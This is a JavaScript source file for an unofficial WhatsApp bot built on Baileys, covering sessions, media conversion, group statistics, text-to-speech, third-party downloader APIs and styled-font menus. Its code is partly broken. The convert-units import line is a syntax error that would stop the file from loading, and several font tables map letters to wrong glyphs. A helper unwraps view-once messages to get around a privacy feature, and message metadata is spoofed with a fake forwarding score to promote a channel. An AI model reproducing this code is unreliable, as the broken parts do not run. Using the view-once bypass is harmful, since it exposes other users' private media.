require('dotenv').config();
const fs = require('fs'), os = require('os'), path = require('path'), crypto = require('crypto');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);
const {
  useMultiFileAuthState, makeWASocket, delay, DisconnectReason, Browsers,
  downloadContentFromMessage, downloadMediaMessage, getContentType,
  generateWAMessageFromContent, proto, jidNormalizedUser, areJidsSameUser
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const axios = require('axios');
const FormData = require('form-data');
const qrcode = require('qrcode-terminal');
const sharp = require('sharp');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const express = require('express');

let moment = null; try { moment = require('moment-timezone'); } catch(e){ try { moment = require('moment'); } catch(e2){} }
let convert = null; try { convert = require('convert-units').default || requireonvert-units'); } catch(e){}
let archiver = null; try { archiver = require('archiver'); } catch(e){}
let Tesseract = null; try { Tesseract = require('tesseract.js'); } catch(e){}
let OpenAI = null; try { OpenAI = require('openai'); } catch(e){}
let yts = null; try { yts = require('yt-search'); } catch(e){ console.log('[!] yt-search not installed'); }
let ytdl = null; try { ytdl = require('ytdl-core'); } catch(e){ console.log('[!] ytdl-core not installed'); }

let ffmpegPath = 'ffmpeg';
try { ffmpegPath = require('ffmpeg-static') || 'ffmpeg'; } catch(e) {}

process.on('unhandledRejection', r => console.error('[!] Rejection:', r?.message || r));
process.on('uncaughtException', e => console.error('[!] Exception:', e?.message || e));

/* ═══════════════════════════════════════════════════════════════════════
   NEWSLETTER CONTEXT
   ═══════════════════════════════════════════════════════════════════════ */
const CHANNEL_LINK = "https://whatsapp.com/channel/0029Vb8cfQn8V0te5K0atc1s";
const NEWSLETTER_JID = "0029Vb8St8B4yltNNUF6ZR3J@newsletter";

const CHANNEL_CONTEXT = {
  isForwarded: true,
  forwardingScore: 999,
  forwardedNewsletterMessageInfo: {
    newsletterJid: NEWSLETTER_JID,
    newsletterName: "Vantevious",
    serverMessageId: 1
  },
  externalAdReply: {
    title: "📢 View Channel",
    body: "㊡𝐊𝐀𝐘𝐒𝐄𝐔𝐑-𝐌𝐃𝐗㊦",
    mediaType: 1,
    thumbnailUrl: "https://files.catbox.moe/so7l3s.png",
    sourceUrl: CHANNEL_LINK,
    renderLargerThumbnail: false
  }
};

function channelFooter(text) {
  return `${text}\n\n━━━━━━━━━━━━━━━\n📢 *Tap "View Channel" below*`;
}

/* ═══════════════════════════════════════════════════════════════════════
   EXPORTED UTILITIES
   ═══════════════════════════════════════════════════════════════════════ */
function runtime(seconds) {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor(seconds % (3600 * 24) / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? d + (d === 1 ? " day, " : " days, ") : "";
  const hDisplay = h > 0 ? h + (h === 1 ? " hour, " : " hours, ") : "";
  const mDisplay = m > 0 ? m + (m === 1 ? " minute, " : " minutes, ") : "";
  const sDisplay = s > 0 ? s + (s === 1 ? " second" : " seconds") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
}

async function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

function smsg(sock, m) {
  if (!m) return m;
  try {
    if (m.key) {
      m.id = m.key.id;
      m.from = m.key.remoteJid?.startsWith('status')
        ? jidNormalizedUser(m.key?.participant || m.participant)
        : jidNormalizedUser(m.key.remoteJid);
      m.isBaileys = m.id?.startsWith('BAE5') && m.id.length === 16;
      m.chat = m.key.remoteJid;
      m.fromMe = m.key.fromMe;
      m.isGroup = m.chat?.endsWith('@g.us');
      m.sender = jidNormalizedUser(m.fromMe && sock.user?.id || m.participant || m.key.participant || m.chat || '');
      if (m.isGroup) m.participant = jidNormalizedUser(m.key.participant) || '';
    }
    if (m.message) {
      m.mtype = getContentType(m.message);
      m.msg = (m.mtype === 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype]);
      m.body = m.message?.conversation || m.msg?.caption || m.msg?.text
        || (m.mtype === 'listResponseMessage') && m.msg?.singleSelectReply?.selectedRowId
        || (m.mtype === 'buttonsResponseMessage') && m.msg?.selectedButtonId
        || (m.mtype === 'viewOnceMessage') && m.msg?.caption || m.text;
      const quoted = m.quoted = m.msg?.contextInfo ? m.msg?.contextInfo?.quotedMessage : null;
      m.mentionedJid = m.msg?.contextInfo ? m.msg?.contextInfo?.mentionedJid : [];
      if (m.quoted) {
        let type = getContentType(quoted);
        m.quoted = m.quoted[type];
        if (typeof m.quoted === 'string') m.quoted = { text: m.quoted };
        m.quoted.key = {
          remoteJid: m.msg?.contextInfo?.remoteJid || m.from,
          participant: jidNormalizedUser(m.msg?.contextInfo?.participant),
          fromMe: areJidsSameUser(jidNormalizedUser(m.msg?.contextInfo?.participant), jidNormalizedUser(sock?.user?.id)),
          id: m.msg?.contextInfo?.stanzaId,
        };
        m.quoted.mtype = type;
        m.quoted.from = /g\.us|status/.test(m.msg?.contextInfo?.remoteJid) ? m.quoted.key.participant : m.quoted.key.remoteJid;
        m.quoted.id = m.msg.contextInfo.stanzaId;
        m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
        m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false;
        m.quoted.sender = jidNormalizedUser(m.msg.contextInfo.participant);
        m.quoted.fromMe = m.quoted.sender === (sock.user && sock.user.id);
        m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || '';
        m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      }
    }
  } catch(e) { console.error('smsg:', e.message); }
  return m;
}

/* ── SESSION DIRS ── */
const MAIN_SESSION_DIR = './vante-session';
const PAIR_SESSIONS_DIR = './sessions';
const WEB_PAIR_DIR = './pair-websessions';
const TMP_DIR = './tmp', PLUGINS_DIR = './plugins', DB_DIR = './database';
[MAIN_SESSION_DIR, PAIR_SESSIONS_DIR, WEB_PAIR_DIR, TMP_DIR, PLUGINS_DIR, DB_DIR].forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });

/* ── GLOBAL STATE ── */
const activePairs = new Map(), userSpamData = new Map(), demandLockGroups = new Set(),
      messageWatchers = new Map(), BLACKLIST = new Set(), godmodeGroups = new Set(),
      cagedGroups = new Map(), lastKickers = new Map(), warnStore = new Map(),
      muteStore = new Map(), userNotes = new Map(), userTodos = new Map(),
      pairingCooldown = new Map(), pairFailures = new Map(),
      messageCache = new Map(), spamTracker = new Map(), plugins = {},
      welcomeTimers = new Map(), aiDmSessions = new Map();
let destructActive = false, autoBotActive = false;

const runtimeConfigs = new Map();
const menuLoadingUsers = new Set();
const menuMessageTracker = new Map();
const botStatusReplyCache = new Map();

global.__pairNotify = global.__pairNotify || {};
global.__mainSock = null;

const BOT_NAME = '𝐊𝐀𝐘𝐒𝐄𝐔𝐑-𝐌𝐃𝐗';
const OWNER_NAME = '*ᴍʀ ᴋɪɴɢ ᴋᴀʏsᴇᴜʀ ᴛʜᴇ ɢʟɪᴛᴄʜ ᴅᴇᴠ*';
const OWNER_NUMBER = process.env.OWNER_NUMBER || '242067828609';
const VERSION = '22.7.1 🇮 🇨 🇪 🇷';
const startTime = Date.now();
const BOT_EMOJI = '🍓';
const TELEGRAPH_UPLOAD = 'https://telegra.ph/upload';
const MENU_IMAGE = './bot.jpg';
const MENU_IMAGE_URL = 'https://files.catbox.moe/so7l3s.png';
global.owner = OWNER_NUMBER ? OWNER_NUMBER + '@s.whatsapp.net' : '';
global.botName = BOT_NAME; global.ownerName = OWNER_NAME;

const DEFAULT_PREFIX = '!';
const PAIR_SESSION_LIFETIME_MS = 4 * 60 * 1000;
const PAIR_CODE_REFRESH_MS = 3 * 60 * 1000;

let genAI = null;
if (process.env.GEMINI_API_KEY) {
  try { genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY); } catch(e){}
}
let openai = null;
try { if (process.env.OPENAI_API_KEY && OpenAI) openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY }); } catch(e){}

/* ═══════════════════════════════════════════════════════════════════════
   AUDIO & VIDEO CONVERTER UTILITIES
   ═══════════════════════════════════════════════════════════════════════ */
function ffmpeg(buffer, args = [], ext = '', ext2 = '') {
  return new Promise(async (resolve, reject) => {
    try {
      const tempDir = TMP_DIR;
      if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
      let tmp = path.join(tempDir, Date.now() + '.' + ext);
      let out = tmp + '.' + ext2;
      await fs.promises.writeFile(tmp, buffer);
      spawn(ffmpegPath, ['-y', '-i', tmp, ...args, out])
        .on('error', reject)
        .on('close', async (code) => {
          try {
            await fs.promises.unlink(tmp).catch(() => {});
            if (code !== 0) return reject(new Error('ffmpeg code ' + code));
            const data = await fs.promises.readFile(out);
            await fs.promises.unlink(out).catch(() => {});
            resolve(data);
          } catch (e) { reject(e); }
        });
    } catch (e) { reject(e); }
  });
}
function toAudio(buffer, ext) {
  return ffmpeg(buffer, ['-vn', '-ac', '2', '-b:a', '128k', '-ar', '44100', '-f', 'mp3'], ext, 'mp3');
}
function toPTT(buffer, ext) {
  return ffmpeg(buffer, ['-vn', '-c:a', 'libopus', '-b:a', '128k', '-vbr', 'on', '-compression_level', '10'], ext, 'opus');
}
function toVideo(buffer, ext) {
  return ffmpeg(buffer, ['-c:v', 'libx264', '-c:a', 'aac', '-ab', '128k', '-ar', '44100', '-crf', '32', '-preset', 'slow'], ext, 'mp4');
}

/* ═══════════════════════════════════════════════════════════════════════
   GROUP STATS DATABASE
   ═══════════════════════════════════════════════════════════════════════ */
const GROUP_STATS_PATH = path.join(DB_DIR, 'groupStats.json');
function loadGroupStatsDB() {
  try {
    if (!fs.existsSync(GROUP_STATS_PATH)) return {};
    return JSON.parse(fs.readFileSync(GROUP_STATS_PATH, 'utf8'));
  } catch(e) { return {}; }
}
function saveGroupStatsDB(data) {
  try { fs.writeFileSync(GROUP_STATS_PATH, JSON.stringify(data, null, 2)); } catch(err) { console.error('[groupStats] save error:', err.message); }
}
const addMessage = (groupId, senderId, opts = {}) => addGroupStatsMessage(groupId, senderId, opts);
const getStats = (groupId) => getGroupStats(groupId);
const getWeeklyStats = (groupId) => getWeeklyGroupStats(groupId);
function addGroupStatsMessage(groupId, senderId, opts = {}) {
  const db = loadGroupStatsDB();
  const today = new Date().toISOString().slice(0, 10);
  const hour = new Date().getHours();
  if (!db[groupId]) db[groupId] = {};
  if (!db[groupId][today]) {
    db[groupId][today] = { total: 0, users: {}, hours: {}, night: {}, mentioned: {}, stickers: {} };
  }
  const g = db[groupId][today];
  if (!g.users) g.users = {}; if (!g.hours) g.hours = {}; if (!g.night) g.night = {}; if (!g.mentioned) g.mentioned = {}; if (!g.stickers) g.stickers = {};
  if (typeof g.total !== 'number') g.total = 0;
  g.total++;
  g.users[senderId] = (g.users[senderId] || 0) + 1;
  g.hours[hour] = (g.hours[hour] || 0) + 1;
  if (hour >= 22 || hour < 6) g.night[senderId] = (g.night[senderId] || 0) + 1;
  if (opts.mentions?.length) for (const m of opts.mentions) g.mentioned[m] = (g.mentioned[m] || 0) + 1;
  if (opts.sticker) g.stickers[senderId] = (g.stickers[senderId] || 0) + 1;
  saveGroupStatsDB(db);
}
function getGroupStats(groupId) {
  const db = loadGroupStatsDB();
  const today = new Date().toISOString().slice(0, 10);
  if (!db[groupId] || !db[groupId][today]) return null;
  return db[groupId][today];
}
function getWeeklyGroupStats(groupId) {
  const db = loadGroupStatsDB();
  if (!db[groupId]) return null;
  const users = {}; let total = 0; const now = new Date();
  for (let i = 0; i < 7; i++) {
    const d = new Date(now); d.setDate(d.getDate() - i);
    const key = d.toISOString().slice(0, 10);
    const day = db[groupId][key]; if (!day) continue;
    total += day.total || 0;
    for (const [uid, count] of Object.entries(day.users || {})) users[uid] = (users[uid] || 0) + count;
  }
  if (!total) return null;
  return { total, users };
}
function rankUsers(map, limit = 5) {
  return Object.entries(map || {}).sort((a, b) => b[1] - a[1]).slice(0, limit);
}

/* ═══════════════════════════════════════════════════════════════════════
   TEXT-TO-SPEECH (TTS) ENGINE
   ═══════════════════════════════════════════════════════════════════════ */
const TTS_MAX_CHARS = 200;
const TTS_LANGS = new Set(['en', 'hi', 'id', 'es', 'fr', 'de', 'pt', 'ar', 'ja', 'ko']);
function detectTtsLang(text) {
  if (/[\u0900-\u097F]/.test(text)) return 'hi';
  if (/[\u0600-\u06FF]/.test(text)) return 'ar';
  if (/[\u3040-\u30FF\u4E00-\u9FFF]/.test(text)) return 'ja';
  return 'en';
}
const generateSpeech = (text, lang) => generateSpeechAudio(text, lang);
const detectLang = (text) => detectTtsLang(text);
const MAX_CHARS = TTS_MAX_CHARS;
const LANGS = TTS_LANGS;
async function generateSpeechAudio(text, lang) {
  const trimmed = String(text).trim().slice(0, TTS_MAX_CHARS);
  if (!trimmed) throw new Error('No text provided');
  const url = `https://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&tl=${lang}&q=${encodeURIComponent(trimmed)}`;
  const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 30000, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' } });
  const buffer = Buffer.from(response.data);
  if (!buffer.length) throw new Error('Empty audio response');
  return buffer;
}
function parseTtsInput(args) {
  if (!args.length) return { text: '', lang: 'en' };
  const first = args[0].toLowerCase();
  if (TTS_LANGS.has(first) && args.length > 1) return { lang: first, text: args.slice(1).join(' ') };
  const text = args.join(' ');
  return { text, lang: detectTtsLang(text) };
}

/* ═══════════════════════════════════════════════════════════════════════
   CENTRALIZED API CLIENTS (EliteProTech, Yupra, Okatsu, Izumi, etc.)
   ═══════════════════════════════════════════════════════════════════════ */
const apiClient = axios.create({
  timeout: 35000,
  headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
});

const APIs = {
  generateImage: async (prompt) => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/ai/stablediffusion`, { params: { prompt } }); return response.data; }
    catch (e) { throw new Error('Failed to generate image'); }
  },
  chatAI: async (text) => {
    try {
      const response = await apiClient.get(`https://api.shizo.top/ai/gpt?apikey=shizo&query=${encodeURIComponent(text)}`);
      if (response.data && response.data.msg) return { msg: response.data.msg };
      return response.data;
    } catch (e) { throw new Error('Failed to get AI response'); }
  },
  ytDownload: async (url, type = 'audio') => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/d/ytmp3`, { params: { url } }); return response.data; }
    catch (e) { throw new Error('Failed to download YouTube video'); }
  },
  igDownload: async (url) => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/d/igdl`, { params: { url } }); return response.data; }
    catch (e) { throw new Error('Failed to download Instagram content'); }
  },
  tiktokDownload: async (url) => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/d/tiktok`, { params: { url } }); return response.data; }
    catch (e) { throw new Error('Failed to download TikTok video'); }
  },
  translate: async (text, to = 'en') => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/tools/translate`, { params: { text, to } }); return response.data; }
    catch (e) { throw new Error('Translation failed'); }
  },
  getMeme: async () => {
    try { const response = await apiClient.get('https://meme-api.com/gimme'); return response.data; }
    catch (e) { throw new Error('Failed to fetch meme'); }
  },
  getQuote: async () => {
    try { const response = await apiClient.get('https://api.quotable.io/random'); return response.data; }
    catch (e) { throw new Error('Failed to fetch quote'); }
  },
  getJoke: async () => {
    try { const response = await apiClient.get('https://official-joke-api.appspot.com/random_joke'); return response.data; }
    catch (e) { throw new Error('Failed to fetch joke'); }
  },
  getWeather: async (city) => {
    try { const response = await apiClient.get(`https://api.siputzx.my.id/api/tools/weather`, { params: { city } }); return response.data; }
    catch (e) { throw new Error('Failed to fetch weather'); }
  },
  shortenUrl: async (url) => {
    try { const response = await apiClient.get(`https://tinyurl.com/api-create.php`, { params: { url } }); return response.data; }
    catch (e) { throw new Error('Failed to shorten URL'); }
  },
  wikiSearch: async (query) => {
    try { const response = await apiClient.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`); return response.data; }
    catch (e) { throw new Error('Wikipedia search failed'); }
  },
  getIzumiDownloadByQuery: async (query) => {
    const apiUrl = `https://izumiiiiiiii.dpdns.org/downloader/youtube-play?query=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 60000 });
    if (res?.data?.result?.download) return res.data.result;
    throw new Error('Izumi youtube-play returned no download');
  },
  getIzumiDownloadByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://izumiiiiiiii.dpdns.org/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=mp3`, { timeout: 60000 });
    if (res?.data?.result?.download) return res.data.result;
    throw new Error('Izumi youtube url returned no download');
  },
  getYupraDownloadByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://api.yupra.my.id/api/downloader/ytmp3?url=${encodeURIComponent(youtubeUrl)}`, { timeout: 60000 });
    if (res?.data?.success && res?.data?.data?.download_url) {
      return { download: res.data.data.download_url, title: res.data.data.title, thumbnail: res.data.data.thumbnail };
    }
    throw new Error('Yupra returned no download');
  },
  getOkatsuDownloadByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://okatsu-rolezapiiz.vercel.app/downloader/ytmp3?url=${encodeURIComponent(youtubeUrl)}`, { timeout: 60000 });
    if (res?.data?.dl) return { download: res.data.dl, title: res.data.title, thumbnail: res.data.thumb };
    throw new Error('Okatsu ytmp3 returned no download');
  },
  getEliteProTechDownloadByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(youtubeUrl)}&format=mp3`, { timeout: 60000 });
    if (res?.data?.success && res?.data?.downloadURL) return { download: res.data.downloadURL, title: res.data.title };
    throw new Error('EliteProTech ytdown returned no download');
  },
  getEliteProTechVideoByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(youtubeUrl)}&format=mp4`, { timeout: 60000 });
    if (res?.data?.success && res?.data?.downloadURL) return { download: res.data.downloadURL, title: res.data.title };
    throw new Error('EliteProTech ytdown video returned no download');
  },
  getYupraVideoByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://api.yupra.my.id/api/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`, { timeout: 60000 });
    if (res?.data?.success && res?.data?.data?.download_url) {
      return { download: res.data.data.download_url, title: res.data.data.title, thumbnail: res.data.data.thumbnail };
    }
    throw new Error('Yupra returned no download');
  },
  getOkatsuVideoByUrl: async (youtubeUrl) => {
    const res = await axios.get(`https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`, { timeout: 60000 });
    if (res?.data?.result?.mp4) return { download: res.data.result.mp4, title: res.data.result.title };
    throw new Error('Okatsu ytmp4 returned no mp4');
  },
  getTikTokDownload: async (url) => {
    const res = await axios.get(`https://api.siputzx.my.id/api/d/tiktok?url=${encodeURIComponent(url)}`, { timeout: 20000 });
    if (res.data?.status && res.data?.data) {
      let videoUrl = res.data.data.urls?.[0] || res.data.data.video_url || res.data.data.url || res.data.data.download_url;
      let title = res.data.data.metadata?.title || 'TikTok Video';
      return { videoUrl, title };
    }
    throw new Error('TikTok download failed');
  },
  screenshotWebsite: async (url) => {
    const res = await axios.get(`https://eliteprotech-apis.zone.id/ssweb?url=${encodeURIComponent(url)}`, { timeout: 30000, responseType: 'arraybuffer' });
    return Buffer.from(res.data);
  },
  textToSpeech: async (text) => {
    const res = await axios.get(`https://www.laurine.site/api/tts/tts-nova?text=${encodeURIComponent(text)}`, { timeout: 30000 });
    if (res.data) {
      if (typeof res.data === 'string' && res.data.startsWith('http')) return res.data;
      if (res.data.data?.URL || res.data.data?.url) return res.data.data.URL || res.data.data.url;
      if (res.data.URL || res.data.url) return res.data.URL || res.data.url;
    }
    throw new Error('Invalid TTS response');
  }
};


/* ── FONTS ── */
const fonts = {
  bold: t => { const m={a:'𝖆',b:'𝖇',c:'c',d:'𝖉',e:'𝖊',f:'𝖋',g:'𝖌',h:'𝍡',i:'𝖎',j:'𝏏',k:'𝖐',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝖔',p:'𝖕',q:'𝖖',r:'𝖗',s:'𝖘',t:'𝖙',u:'𝖚',v:'𝖛',w:'𝖜',x:'𝝝',y:'𝞞',z:'𝖟',A:'𝖆',B:'𝖇',C:'𝈈',D:'𝖉',E:'𝖊',F:'𝖋',G:'𝖌',H:'𝍡',I:'𝖎',J:'𝏏',K:'𝖐',L:'𝖑',M:'𝖒',N:'𝖓',O:'𝖔',P:'𝕕',Q:'𝖖',R:'𝖗',S:'𝖘',T:'𝖙',U:'𝖚',V:'𝖛',W:'𝖜',X:'𝝝',Y:'𝞞',Z:'𝟟',0:'𝟎',1:'𝟏',2:'𝟐',3:'𝟑',4:'𝟒',5:'𝟓',6:'𝟔',7:'𝟕',8:'𝟖',9:'𝟗'}; return t.toString().split('').map(c=>m[c]||c).join(''); },
  fraktur: t => { const m={a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔥',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝖑',m:'𝖒',n:'𝖓',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',A:'𝔄',B:'𝔅',C:'𝔆',D:'𝔇',E:'𝔈',F:'𝔉',G:'𝔊',H:'ℌ',I:'ℑ',J:'𝍍',K:'𝔎',L:'𝔏',M:'𝔐',N:'𝔑',O:'𝒪',P:'𝓓',Q:'𝔔',R:'ℜ',S:'𝔖',T:'𝔗',U:'𝔘',V:'𝙑',W:'𝔚',X:'𝔛',Y:'𝔜',Z:'ℨ'}; return t.toString().split('').map(c=>m[c]||c).join(''); },
  mono: t => { const m={a:'𝚊',b:'𝚋',c:'𝚌',d:'𝚍',e:'𝚎',f:'𝚏',g:'𝚐',h:'𝚑',i:'𝚒',j:'𝚓',k:'𝚔',l:'𝚕',m:'𝖒',n:'𝖓',o:'𝚘',p:'𝚙',q:'𝚙',r:'𝚛',s:'𝚜',t:'𝚝',u:'𝚞',v:'𝚟',w:'𝚠',x:'𝚡',y:'𝚢',z:'𝚣',A:'𝙰',B:'𝙱',C:'𝙲',D:'𝙳',E:'𝙴',F:'𝙵',G:'𝙶',H:'𝙷',I:'𝙸',J:'𝙸',K:'𝙺',L:'𝙻',M:'𝙼',N:'𝙽',O:'𝙾',P:'𝙿',Q:'𝙺',R:'𝚁',S:'𝚂',T:'𝚃',U:'𝚄',V:'𝚅',W:'𝚆',X:'𝚇',Y:'𝚈',Z:'𝚉'}; return t.toString().split('').map(c=>m[c]||c).join(''); },
  script: t => { const m={a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'ℯ',f:'𝒻',g:'𝒊',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'ℴ',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝒷',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'𝒱',G:'𝒢',H:'ℋ',I:'𝒐',J:'𝒥',K:'𝒦',L:'𝒧',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵'}; return t.toString().split('').map(c=>m[c]||c).join(''); }
};

const GLYPH = { rune:'𓂀', scarab:'𓆣', bolt:'⚡' };

const style = {
  banner: (t, s='Vantevious Reborn') => `╔══════════════════════════╗\n║  ${GLYPH.rune}  ${fonts.bold(t)}\n║  ${fonts.script(s)}\n╚══════════════════════════╝`,
  header: t => `╔══════════════════════════╗\n║  ${fonts.bold(t)}\n╚══════════════════════════╝`,
  box: (t, c) => `╭───『 \`${t}\` 』───\n${c}\n╰──────────────────────☉`,
  box2: (t, c, i='◈') => `╭─${i}─『 *${t}* 』─${i}─╮\n${c}\n╰${'━'.repeat(22)}☉`,
  kv: (k, v) => `> ${GLYPH.rune} *${k}:* ${v}`,
  error: t => `❌ ${fonts.mono(t)}`,
  success: t => `✅ ${fonts.script(t)}`,
  wait: t => `⏳ ${fonts.script(t || 'Processing...')}`,
  warning: t => `⚠️ ${fonts.script(t)}`,
  tip: t => `💡 ${fonts.script(t)}`,
  reply: async (sock, sender, text, msg, options) => {
    try { return await sock.sendMessage(sender, { text: `${text} ${BOT_EMOJI}`, ...(options||{}) }, msg ? { quoted: msg } : {}); }
    catch(e) { console.error('Reply:', e.message); }
  },
  react: async (sock, sender, msg, emoji) => {
    try { if (msg?.key) await sock.sendMessage(sender, { react: { text: emoji || BOT_EMOJI, key: msg.key } }); } catch(e){}
  },
  sendImageMessage: async (sock, sender, src, caption, msg) => {
    try { await sock.sendMessage(sender, { image: { url: src }, caption: `${caption} ${BOT_EMOJI}` }, msg ? { quoted: msg } : {}); }
    catch(e) { await sock.sendMessage(sender, { text: `${caption} ${BOT_EMOJI}` }, msg ? { quoted: msg } : {}); }
  }
};

/* ── PER-SOCKET RUNTIME ── */
function getRuntime(sock) {
  const jid = (sock?.user?.id || 'global').split(':')[0];
  if (!runtimeConfigs.has(jid)) {
    runtimeConfigs.set(jid, {
      settings: {
        autoStatusView: false, autoReact: true, autoReply: false, aiDm: true,
        autoReplyText: 'Sorry, my owner is unavailable. Please leave a message.',
        antilink: false, antibot: false, antidelete: false, autotyping: false, anticall: false,
        antileave: false, antibadword: false, antiimage: false, antistatusmention: false,
        antispam: false, antiviewonce: false, antipromote: false, antidemote: false,
        antiraid: false, welcome: true, goodbye: true,
        badwords: ['badword1', 'badword2'],
        targetChannel: null
      },
      SUDO: new Set(),
      BOT_MODE: 'public',
      OWNER_ONLY: false,
      userNotes: new Map(),
      userTodos: new Map(),
      warnStore: new Map(),
      welcomeConfig: new Map(),
      customPrefix: DEFAULT_PREFIX
    });
    const f = `./vante-${jid.replace(/[^0-9]/g, '')}.json`;
    try {
      if (fs.existsSync(f)) {
        const d = JSON.parse(fs.readFileSync(f, 'utf8'));
        const rt = runtimeConfigs.get(jid);
        if (d.settings) rt.settings = { ...rt.settings, ...d.settings };
        if (d.SUDO) rt.SUDO = new Set(d.SUDO);
        if (d.BOT_MODE) rt.BOT_MODE = d.BOT_MODE;
        if (d.OWNER_ONLY !== undefined) rt.OWNER_ONLY = d.OWNER_ONLY;
        if (d.customPrefix) rt.customPrefix = d.customPrefix;
        if (d.notes) rt.userNotes = new Map(Object.entries(d.notes));
        if (d.todos) rt.userTodos = new Map(Object.entries(d.todos));
        if (d.warns) for (const [g, v] of Object.entries(d.warns)) rt.warnStore.set(g, new Map(Object.entries(v)));
        if (d.welcome) for (const [g, v] of Object.entries(d.welcome)) rt.welcomeConfig.set(g, v);
      }
    } catch(e) {}
  }
  return runtimeConfigs.get(jid);
}

function saveRuntime(sock) {
  const jid = (sock?.user?.id || 'global').split(':')[0];
  const rt = getRuntime(sock);
  const f = `./vante-${jid.replace(/[^0-9]/g, '')}.json`;
  try {
    fs.writeFileSync(f, JSON.stringify({
      settings: rt.settings,
      SUDO: [...rt.SUDO],
      BOT_MODE: rt.BOT_MODE,
      OWNER_ONLY: rt.OWNER_ONLY,
      customPrefix: rt.customPrefix,
      notes: Object.fromEntries(rt.userNotes),
      todos: Object.fromEntries(rt.userTodos),
      warns: Object.fromEntries([...rt.warnStore].map(([g, m]) => [g, Object.fromEntries(m)])),
      welcome: Object.fromEntries(rt.welcomeConfig)
    }, null, 2));
  } catch(e) {}
}

const isOwner = jid => {
  if (!jid || !OWNER_NUMBER) return false;
  return jid.split('@')[0].split(':')[0] === OWNER_NUMBER;
};

const isSudoFor = (sock, jid) => {
  if (!jid) return false;
  const rt = getRuntime(sock);
  const n = jid.split('@')[0].split(':')[0];
  return isOwner(jid) || rt.SUDO.has(n);
};

/* ── MEDIA HELPERS ── */
async function downloadMsg(sock, msg) {
  try {
    const ctx = msg.message?.extendedTextMessage?.contextInfo ||
                msg.message?.imageMessage?.contextInfo ||
                msg.message?.videoMessage?.contextInfo ||
                msg.message?.audioMessage?.contextInfo ||
                msg.message?.stickerMessage?.contextInfo;
    const quoted = ctx?.quotedMessage;
    const target = quoted ? { key: { ...msg.key, id: ctx.stanzaId }, message: quoted } : msg;
    return await downloadMediaMessage(target, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
  } catch(e) { console.error('downloadMsg:', e.message); return null; }
}

async function getMenuImageBuffer() {
  try {
    if (fs.existsSync(MENU_IMAGE)) return fs.readFileSync(MENU_IMAGE);
    const r = await axios.get(MENU_IMAGE_URL, { responseType: 'arraybuffer', timeout: 10000 });
    return Buffer.from(r.data);
  } catch(e) { return null; }
}

function unwrapViewOnce(message) {
  if (!message) return null;
  const wrappers = ['viewOnceMessageV2', 'viewOnceMessageV2Extension', 'viewOnceMessage'];
  for (const w of wrappers) {
    if (message[w]?.message) return message[w].message;
  }
  for (const k of ['imageMessage', 'videoMessage', 'audioMessage']) {
    if (message[k]?.viewOnce) return message;
  }
  return null;
}

/* ── BUTTONS / CAROUSEL ── */
